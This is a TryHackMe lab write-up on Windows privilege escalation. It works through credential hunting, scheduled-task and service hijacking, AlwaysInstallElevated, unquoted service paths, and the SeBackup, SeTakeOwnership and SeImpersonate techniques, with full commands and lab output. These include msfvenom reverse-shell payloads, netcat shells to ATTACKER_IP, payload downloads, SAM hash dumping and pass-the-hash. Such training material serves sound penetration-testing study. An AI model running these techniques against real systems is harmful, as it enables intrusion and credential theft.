---
title: "Windows Privilege Escalation Writeup"
date: 2025-08-17 12:11:00
categories: [TryHackMe, Jr Penetration Tester]
tag: [Privilege Escalation]
author: Aisha
---



## Interoduction
**Room Link:** [windowsprivesc20](ttps://tryhackme.com/room/windowsprivesc20)

Privilege escalation (PrivEsc) means exploiting weaknesses to move from a lower-privileged account to a higher-privileged one, often targeting **administrative access**.

### **1. User Types in Windows**

| **Account Type** | **Privileges** |
| --- | --- |
| **Administrators** | Full system control (install software, modify settings, access all files). |
| **Standard Users** | Limited access (can only use apps, no system-wide changes). |
| **SYSTEM/LocalSystem** | Highest privilege (more than admin), used by OS for critical tasks. |
| **Local Service** | Limited local rights, anonymous network access. |
| **Network Service** | Limited local rights, authenticates as the computer on the network. |

### **2. Common PrivEsc Methods**

- **Credential Hunting**
    - Finding passwords in files, registry, memory, or insecure configurations.
- **Misconfigurations**
    - Weak service permissions, insecure scheduled tasks, writable system files.
- **Excessive Privileges**
    - Your current account has unnecessary rights (e.g., backup operators modifying system files).
- **Vulnerable Software**
    - Exploiting unpatched programs running with high privileges.
- **Missing Patches**
    - Using known kernel/OS exploits (e.g., PrintNightmare, EternalBlue).

---

## Harvesting Passwords from Usual Spots

When performing privilege escalation on Windows, **credentials** are often hidden in unexpected places. Here’s a quick breakdown of common locations where passwords might be stored:

### **1. Unattended Windows Installations**

- Automated Windows setups may store admin credentials in config files.
- Location:
    
    ```
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
    ```
    
- **Look for**
    
    ```xml
    <Credentials><Username>Administrator</Username><Password>MyPassword123</Password></Credentials>
    ```
    

### **2. PowerShell Command History**

- PowerShell saves previously executed commands, including passwords.
- Location:

```powershell
# From cmd.exe:
type "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# From PowerShell:
cat "$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

<img width="1513" height="581" alt="Screenshot 2025-08-13 140105" src="https://github.com/user-attachments/assets/f7b9b2ea-9468-4308-b66b-29f8099c1be3" />

### **3. Saved Windows Credentials (cmdkey & runas)**

- Windows may store credentials for reuse.
- **Check saved creds:**
    
    ```powershell
    cmdkey /list
    ```
    
- **Use them to escalate:**
    
    ```powershell
    runas /savecred /user:admin cmd.exe  # Opens cmd as admin if creds are stored
    ```
    <img width="1585" height="504" alt="Screenshot 2025-08-13 140816" src="https://github.com/user-attachments/assets/ed6a693d-4bc6-4501-a304-9ebf8bfcf2cd" />


### **4. IIS Web Server Config (web.config)**

- IIS websites may store database passwords.
- Location:
    
    ```powershell
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    ```
    
- **Search for passwords:**
    
    ```powershell
    type web.config | findstr "connectionString"
    ```

<img width="1559" height="322" alt="Screenshot 2025-08-13 141931" src="https://github.com/user-attachments/assets/a25a48cb-1019-4bbd-a7f8-662a942ffcd5" />

### **5. PuTTY & Other Software Credentials**

- SSH clients like PuTTY may store proxy credentials.
- **Check PuTTY saved passwords:**
    
    ```powershell
    reg query HKCU\Software\SimonTatham\PuTTY\Sessions /f "Proxy" /s
    ```
<img width="1442" height="666" alt="Screenshot 2025-08-13 143200" src="https://github.com/user-attachments/assets/a928f8db-a5f8-4a3a-8bd2-a11ee137f79e" />

- **Other Software:**
    - Browsers (Chrome, Edge)
    - Email clients (Outlook, Thunderbird)
    - FTP clients (FileZilla, WinSCP)
    - **Tools to extract passwords:**
        - **`LaZagne`** (all-in-one password recovery)
        - **`Mimikatz`** (Windows credential dumping)

## **Quick Wins for Privilege Escalation**

1. **Search for passwords in files:**
    
    ```powershell
    findstr /si password *.txt *.xml *.config *.ini
    ```
    
2. **Check registry for stored creds:**
    
    ```powershell
    reg query HKLM /f "password" /t REG_SZ /s
    ```
    
3. **Dump passwords from memory:**
    - Use **Mimikatz** (**`sekurlsa::logonpasswords`**)

### **Scheduled Tasks (PrivEsc by Hijacking Tasks)**

**Scenario:** A scheduled task runs a script/binary that your current user can modify.

**Steps:**

1. **List Scheduled Tasks:**
    
    ```powershell
    schtasks /query /fo LIST /v
    ```
    
    Look for **TaskName**, **Task To Run**, and **Run As User**.
    
    <img width="1387" height="704" alt="Screenshot 2025-08-13 143818" src="https://github.com/user-attachments/assets/1e6b9709-faf9-4c44-beb5-1998c73f6ac0" />
    
2. **Check File Permissions:**
    
    ```powershell
    icacls "C:\path\to\task\file.bat"
    ```
    
    If your user has **F (Full Control)** or **M (Modify)**, you can overwrite it.
    
    <img width="761" height="177" alt="Screenshot 2025-08-13 144203" src="https://github.com/user-attachments/assets/e742e460-8725-4460-8220-145c7a079344" />
    
3. **Replace with Malicious Payload:**
    
    ```powershell
    echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\path\to\task\file.bat
    ```
    
    Or use a **reverse shell** (e.g., PowerShell, msfvenom).
    
4. **Trigger the Task (or Wait):**
    
    ```powershell
    schtasks /run /tn "TaskName"
    ```
    
    If you can’t run it manually, wait for the scheduled time.
    
    <img width="1285" height="178" alt="Screenshot 2025-08-13 144800" src="https://github.com/user-attachments/assets/5a70276e-0edc-4e4f-8090-734a8bcff673" />

5. **Catch the Shell:**
    
    ```powershell
    nc -lvnp 4444
    ```
    
    You’ll get a shell as the user running the task (**taskusr1** in the example).
    
<img width="758" height="367" alt="Screenshot 2025-08-13 144847" src="https://github.com/user-attachments/assets/472e1a8a-7a1d-4715-b252-854b4c1a82b9" />

### **AlwaysInstallElevated (MSI Files as Admin)**

**MSI (Microsoft Installer Package)** is a Windows file format used to install software. Typically runs with the **permissions of the user launching it** (unless configured otherwise).

**Scenario:** Windows allows **any user** to install **`.msi`** files as **SYSTEM/Admin** due to misconfigurations.

**Requirements:**

- **Two registry keys must be set (1 = Enabled):**
    
    ```powershell
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
    
    - If **both return `0x1`**, exploitation is possible.
    
     <img width="1037" height="246" alt="Screenshot 2025-08-13 145021" src="https://github.com/user-attachments/assets/61ec8693-8b7a-4be3-8756-dc762e15bae0" />
    

 To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

**Exploitation Steps:**

1. **Generate Malicious .msi:**
    
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=53 -f msi -o evil.msi
    ```
    
    - (Or use a custom payload like adding a user to **Administrators**.)
2. **Upload & Execute:**
    
    ```powershell
    msiexec /quiet /qn /i C:\Temp\evil.msi
    ```
    
    - **`/quiet`** = No UI | **`/qn`** = No prompts.
3. **Receive Shell (or Check for New Admin User):**
    - If using a reverse shell:
        
        ```bash
        nc -lvnp 53
        ```
        

## Abusing Service Misconfigurations

**Windows Services:** 

Windows **services** are background processes that run independently of user sessions, performing system tasks like:

- **Hosting applications** (e.g., web servers, databases).
- **Managing hardware** (e.g., printer spooler).
- **Automating tasks** (e.g., scheduled backups, updates).

**Key Characteristics**

1. **Managed by SCM**
    - The **Service Control Manager (SCM)** handles service lifecycle (start/stop/configure).
    - Accessed via **`sc.exe`**, PowerShell (**`Get-Service`**), or **`services.msc`**.
2. **Run Under Specific Accounts**
    - **LocalSystem** (highest privileges), **NetworkService**, **LocalService**, or custom users.
3. **Startup Types**
    - **Automatic**: Starts at boot.
    - **Manual**: Starts on-demand.
    - **Disabled**: Cannot be started.
4. **Dependencies & Triggers**
    - Some services start only when others are running (e.g., DHCP client depends on TCP/IP).
5. **Registry & Executables**
    - Configs stored in **`HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`**.
    - Each service points to an executable (**`BINARY_PATH_NAME`**).

Here is an example of the apphostsvc service configuration:

<img width="1051" height="367" alt="Screenshot 2025-08-13 150639" src="https://github.com/user-attachments/assets/307013e9-6ab7-40d5-9e02-661905af7dbb" />

- **`SERVICE_START_NAME` :** The name of the account used to run the service
- **`BINARY_PATH_NAME`  :** The executable used to run the service

The services have a **Discretionary Access Control List (DACL)**, which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker.

<img width="1228" height="810" alt="Screenshot 2025-08-13 151440" src="https://github.com/user-attachments/assets/2b77b4ef-881c-46aa-ae61-d62b5cef2778" />

All of the service configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`

<img width="1350" height="749" alt="Screenshot 2025-08-13 151542" src="https://github.com/user-attachments/assets/8579e602-0f9b-4fde-9c8f-9ea9142006eb" />

<img width="1468" height="634" alt="Screenshot 2025-08-13 151833" src="https://github.com/user-attachments/assets/df05ad47-a480-4261-ba6a-1a8f357acdde" />

### **Insecure Permissions on Service Executable**

Windows services run with specific user privileges (often elevated). If the service executable has **weak permissions** (e.g., modifiable by non-admin users), attackers can replace it with malicious code.

**Exploitation Steps**

1. **Identify Vulnerable Service**

```bash
C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1
```

Check **`BINARY_PATH_NAME`** (executable path) and **`SERVICE_START_NAME`** (account privileges).

**2. Verify Permissions**

```bash
C:\Users\thm-unpriv>icacls  C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>
```

The Everyone group has modify permissions (M) on the service's executable. This means we can overwrite it with any malicious payload, and the service will execute it with the privileges of the configured user account.

**3. Replace Executable**

```bash
root@ip-10-10-213-107:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.213.107 LPORT=4445 -f exe-service -o rev-svc.exe
root@ip-10-10-213-107:~# file rev-svc.exe 
rev-svc.exe: PE32+ executable (GUI) x86-64, for MS Windows
```

Start an HTTP server to transfer the executable to the target machine

```bash
root@ip-10-10-213-107:~# python3 -m http.server 8888
```

On the target machine, fetch the executable and save it

```bash
C:\Users\thm-unpriv>certutil -urlcache -split -f http://10.10.213.107:8888/rev-svc.exe C:\PROGRA~2\SYSTEM~1\rev-svc.exe
```

Overwrite the service executable with our payload. You need to make a copy of the service before overwriting it

```bash
C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
C:\PROGRA~2\SYSTEM~1>move rev-svc.exe WService.exe
C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files
```

**4. Trigger Execution**

```bash
C:\PROGRA~2\SYSTEM~1>sc stop windowsscheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x3e8

C:\PROGRA~2\SYSTEM~1>sc start windowsscheduler

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2888
        FLAGS              :
```

**5. Catch the reverse shell** 

```bash
root@ip-10-10-213-107:~# rlwrap nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.114.216 49922
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\svcusr1

C:\Windows\system32>

```

The service restarts, running the payload with the service account's privileges.

### **Unquoted Service Paths**

Unquoted service paths in Windows can be exploited to escalate privileges. When a service's executable path is **unquoted and contains spaces**, Windows Service Control Manager (SCM) searches for the executable in a specific order, splitting the path at each space.

Example: **`C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`** is interpreted as:

**`C:\MyPrograms\Disk.exe`** → **`C:\MyPrograms\Disk Sorter.exe`** → **`C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.ex`**

```bash
C:\Users\thm-unpriv> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

If an attacker can place a malicious executable in a writable directory the service will execute it instead of the intended binary.

```bash
C:\Users\thm-unpriv>icacls C:\MyPrograms
C:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

The **`C:\MyPrograms`** folder allows **regular users (`BUILTIN\Users`)** to create files (`WD`) and create folders (`AD`)

Generate a malicious payload with msfvenom 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.174.91 LPORT=4446 -f exe-service -o rev-svc2.exe
```

Transfer it to the target machine 

```
C:\Users\thm-unpriv>curl http://10.10.174.91:8888/rev-svc2.exe --output rev-svc2.exe
```

Move it to a hijackable location, then change the payload name to  `Disk.exe`

```
C:\Users\thm-unpriv>copy rev-svc2.exe C:\MyPrograms
C:\Users\thm-unpriv>cd C:\MyPrograms
C:\MyPrograms>
C:\MyPrograms>move rev-svc2.exe Disk.exe
C:\MyPrograms>icacls Disk.exe
Disk.exe NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         BUILTIN\Users:(I)(RX)
         WPRIVESC1\thm-unpriv:(I)(F)

Successfully processed 1 files; Failed processing 0 files

C:\MyPrograms>icacls Disk.exe /grant Everyone:F
processed file: Disk.exe
Successfully processed 1 files; Failed processing 0 files

C:\MyPrograms>icacls Disk.exe
Disk.exe Everyone:(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         BUILTIN\Users:(I)(RX)
         WPRIVESC1\thm-unpriv:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

Restart the service to trigger execution.

```
C:\MyPrograms>sc stop "Disk Sorter Enterprise"

SERVICE_NAME: Disk Sorter Enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\MyPrograms>sc start "Disk Sorter Enterprise"

SERVICE_NAME: Disk Sorter Enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 688
        FLAGS              :
```

finally,  you'll get a reverse shell with svcusr2 privileges:

```bash
root@ip-10-10-174-91:~# nc -lvnp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.15.82 49897
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\svcusr2

C:\Windows\system32>

```

<img width="1187" height="245" alt="Screenshot 2025-08-16 144659" src="https://github.com/user-attachments/assets/ffb22eda-1def-4fce-90e9-a0f5b3e20e7a" />

<img width="1337" height="144" alt="Screenshot 2025-08-16 145108" src="https://github.com/user-attachments/assets/faad01c8-6755-49fb-a81e-5dbe5ecba659" />

### **Insecure Service Permissions**

If the service executable DACL is well configured and the service's binary path is correctly quoted, but the **service's DACL** is configured to allow modification, we can reconfigure the service to point it to any executable and run it with any account.

To check for a service DACL from the command line use [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool

```bash
C:\tools\AccessChk>accesschk64.exe -qlc thmservice
Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

the `BUILTIN\\Users` has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service. Create a reverse shell  payload with msfvenom, then reconfigure thmserivce executable to point to our payload, and set the service to run as **`LocalSystem`**.

```bash
C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc2.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS
C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:
C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2124
        FLAGS              :

C:\Users\thm-unpriv>

```

We should receive a shell back in our attacker's machine with SYSTEM privileges

```bash
root@ip-10-10-174-91:~# nc -lvnp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.15.82 49910
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>whoami
whoami
nt authority\system

```

## Abusing dangerous privileges

Privileges in Windows define the specific system-level actions a user account is permitted to perform. These range from basic tasks (like shutting down the system) to advanced permissions (such as bypassing file access controls).

To view the privileges assigned to your current user, run:

```
whoami /priv
```

Attackers focus on **abusable privileges** that allow privilege escalation. For a full list of exploitable privileges, refer to:

- [**Microsoft’s Official Privilege List**](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [**Priv2Admin Project**](https://github.com/gtworek/Priv2Admin) (Exploitable privileges and techniques)

We’ll demonstrate how attackers exploit common high-risk privileges—such as **`SeBackup / SeRestore`** or **`SeImpersonatePrivilege`**—to gain elevated access.

### **SeBackup / SeRestore**

These privileges allow users to perform backups from a system without requiring full administrative privileges, and they have read and write permission to any file in the system.

This means we can simply copy the system and SAM hives and extract the local Administrator's password hash.

```bash
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive

```

Transfer the copied files to the attacking box so we can extract them. Here we are using `mbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:

```bash
root@ip-10-10-174-91:~# mkdir share
root@ip-10-10-174-91:~# python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

```

Copy the hives to the AttackBox machine

```bash
C:\>copy C:\Users\THMBackup\sam.hive \\10.10.174.91\Public
C:\>copy C:\Users\THMBackup\system.hive \\10.10.174.91\Public
```

<img width="1919" height="689" alt="Screenshot 2025-08-16 160530" src="https://github.com/user-attachments/assets/4ddd835b-a8dd-4638-b670-aa2ac16eec40" />

```bash
root@ip-10-10-174-91:~# ls share
sam.hive  system.hive
root@ip-10-10-174-91:~# file share/*
share/sam.hive:    MS Windows registry file, NT/2000 or above
share/system.hive: MS Windows registry file, NT/2000 or above

```

Use impacket’s [secretsdump.py](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/) to read SAM and LSA secrets from registries.

```bash
root@ip-10-10-127-1:~# python3 /opt/impacket/examples/secretsdump.py -system share/system.hive -sam share/sam.hive local
Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up... 

```

Use [psexec.py](https://wadcoms.github.io/wadcoms/Impacket-PsExec/), to perform a Pass-the-Hash attack of the Administrator's account and gain access to the target machine with SYSTEM privileges

```bash
root@ip-10-10-127-1:~# python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.119.143
Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.119.143.....
[*] Found writable share ADMIN$
[*] Uploading file VRXkmiuO.exe
[*] Opening SVCManager on 10.10.119.143.....
[*] Creating service hAWD on 10.10.119.143.....
[*] Starting service hAWD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

### **SeTakeOwnership**

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys. For example we can take ownership of a service executable that runs with SYSTEM privileges.

In this scenario, we will abuse `Utilman.exe` (ease of access) by replacing it with cmd.exe to get a console with system privileges.

```bash
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

```

since we have SeTakeOwnershipPrivilege privileges, we can take the ownership using this command 

```bash
C:\Windows\system32>takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WPRIVESC2\THMTakeOwnership".

C:\Windows\system32>
```

**Note** that taking ownership doesn't mean you have privileges over it, but you can assign yourself any privileges you need on it.

```bash
C:\Windows\system32>icacls Utilman.exe
Utilman.exe NT SERVICE\TrustedInstaller:(F)
            BUILTIN\Administrators:(RX)
            NT AUTHORITY\SYSTEM:(RX)
            BUILTIN\Users:(RX)
            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Windows\system32>icacls Utilman.exe  /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\Windows\system32>icacls Utilman.exe
Utilman.exe WPRIVESC2\THMTakeOwnership:(F)
            NT SERVICE\TrustedInstaller:(F)
            BUILTIN\Administrators:(RX)
            NT AUTHORITY\SYSTEM:(RX)
            BUILTIN\Users:(RX)
            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)

Successfully processed 1 files; Failed processing 0 files
```

Now replace utilman.exe with command prompt

```bash
C:\Windows\System32\> copy cmd.exe utilman.exe

```

To trigger utilman, lock the screen from Start button:

<img width="392" height="239" alt="Screenshot 2025-08-16 180557" src="https://github.com/user-attachments/assets/933e8c32-edfe-4662-9b20-82d227421dd9" />

And proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

<img width="1071" height="303" alt="image" src="https://github.com/user-attachments/assets/2196031c-0a5e-4de4-9eca-e18ef2f69d80" />

<img width="1167" height="393" alt="Screenshot 2025-08-16 180829" src="https://github.com/user-attachments/assets/2683f2a0-73a5-41f0-a7cd-79ed03b6acc2" />

### **SeImpersonate / SeAssignPrimaryToken**

These privileges allow a process to impersonate another user (take their security context) and perform actions on their behalf. Example: An FTP server impersonates logged-in users to access their files without needing shared permissions.

If an attacker controls a process with these privileges, they can impersonate users who authenticate to that process (e.g., SYSTEM, admin accounts). Services running as **LOCAL SERVICE**, **NETWORK SERVICE**, or IIS application pools often have these privileges.

**Two Key Requirements for Successful Privilege Escalation via Impersonation:**

1. **The attacker must create a malicious process capable of accepting authenticated connections.**
    - This process must be able to impersonate users who connect to it (requiring **`SeImpersonate`** or **`SeAssignPrimaryToken`** privileges).
    - Example: A fake WinRM server, a rogue FTP service, or a named pipe listener.
2. **The attacker must trick or force a high-privileged account (e.g., SYSTEM or an admin) to authenticate to the malicious process.**
    - This can be done by:
        - Exploiting service behaviors (e.g., BITS auto-connecting to WinRM).

**Exploitation Steps:**

We have a webshell that runs on IIS. Check the privileges of the compromised website

<img width="869" height="358" alt="Screenshot 2025-08-16 182204" src="https://github.com/user-attachments/assets/cd704ec3-b088-4acf-9541-ad092d5489fd" />

<img width="1006" height="395" alt="Screenshot 2025-08-16 182223" src="https://github.com/user-attachments/assets/9236cbdc-f3af-4bb4-bb6a-aa526c818cc8" />

The target holds both required privileges **SeImpersonate** and **SeAssignPrimaryToken.** We will exploit these privileges with [RogueWinRM.exe](https://github.com/antonioCoco/RogueWinRM); this exploit abuses the **Background Intelligent Transfer Service (BITS)** in Windows to gain SYSTEM privileges. 

The exploit has been uploaded to the target. To start the exploit, we first need to set up our listener and pass these parameters to the exploit.

- `-p` specifies the executable to be run by the exploit, which is netcat
- `-a` pass the next argument to the executable (`nc -e cmd.exe <attacker ip> <port>`)

```bash
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.127.1 4447"
```

<img width="1612" height="623" alt="Screenshot 2025-08-16 184244" src="https://github.com/user-attachments/assets/e20d01af-01eb-4051-9c49-b810968fb8f6" />

## Abusing vulnerable software

### **Unpatched Software**

Some unpatched software can present various privilege escalation opportunities. List installed software and its versions with this command `wmic` 

```bash
C:\Users\thm-unpriv>wmic product get name,version,vendor
Name                                                            Vendor                                   Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     Microsoft Corporation                    14.28.29910
AWS Tools for Windows                                           Amazon Web Services Developer Relations  3.15.1248
